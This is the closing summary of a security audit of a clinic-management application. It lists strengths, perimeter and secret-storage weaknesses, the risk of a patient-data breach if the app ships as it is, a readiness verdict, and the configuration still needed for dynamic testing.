**Major strengths:** Tenant isolation by construction prevents horizontal IDOR at scale; audit trail satisfies compliance; R2+Valkey degrade gracefully.

**Major weaknesses:** Perimeter misconfiguration (CORS, CSP, headers on API) + credential storage make exploitation trivial if one XSS found. Secrets on disk require immediate rotation.

**Critical risks if shipped as-is:** Any attacker site can read clinic data via CORS + stolen token via XSS → mass PHI breach. Cron secret in URLs will leak via logs to third parties.

**Production readiness: NOT READY until Phase 1 complete.** After Phase 1, **CONDITIONAL GO** with continuous monitoring + WAF allowlist.

---

### INSUFFICIENT INFORMATION — Required for full DAST

- Live deployment config: nginx/Caddy reverse-proxy, TLS termination, WAF rules, CDN logs retention.
- Valkey/OpenSearch prod auth/network ACLs.
- R2 bucket policy (public vs private, CORS on bucket).
- CI/CD pipeline (GitHub Actions?) permissions, OIDC, artifact signing.
- Observability: log aggregation, alerting thresholds, incident runbook.
- Pentest target env credentials for authenticated dynamic scans.

*Provide `docker-compose.prod.yml`, `nginx.conf`, CI YAML, Atlas IP allowlist, and a staging API URL with test clinic credentials to complete dynamic verification.*

---

**Deliverable version:** `SEC-AUDIT-MYCLINICS-2026-09-05-v1` — share with engineering as single source of truth for remediation. All locations use `file_path:line_number` for navigation. Rotate redacted secrets immediately and re-verify checklist.
